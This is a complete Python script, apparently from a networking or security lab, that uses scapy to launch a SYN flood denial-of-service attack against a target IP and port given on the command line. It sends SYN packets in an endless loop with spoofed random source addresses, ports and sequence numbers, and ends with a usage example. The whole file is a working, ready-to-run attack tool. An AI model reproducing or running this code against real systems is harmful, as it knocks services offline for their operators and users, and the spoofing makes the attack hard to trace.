#! /usr/bin/env python3

# SYN Flood Attack
import argparse
from random import getrandbits
from ipaddress import IPv4Address

from scapy.all import IP, TCP, send


def syn_flood(target_ip, target_port):

    # Send the SYN packets
    while True:
        # Generate random source IP address and port
        src_ip = str(IPv4Address(getrandbits(32)))
        sport = getrandbits(16)
        seq = getrandbits(32)
        # Create a SYN packet
        packet = IP(src=src_ip, dst=target_ip) / \
            TCP(sport=sport, dport=target_port, seq=seq, flags='S')
        # Send the packet
        send(packet, verbose=False)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SYN Flood Attack")
    parser.add_argument("target_ip", type=str, help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port number")
    args = parser.parse_args()

    syn_flood(args.target_ip, args.target_port)
    # Usage: python3 synflood.py <target_ip> <target_port>
    # Example: python3 synflood.py 10.9.0.5 23
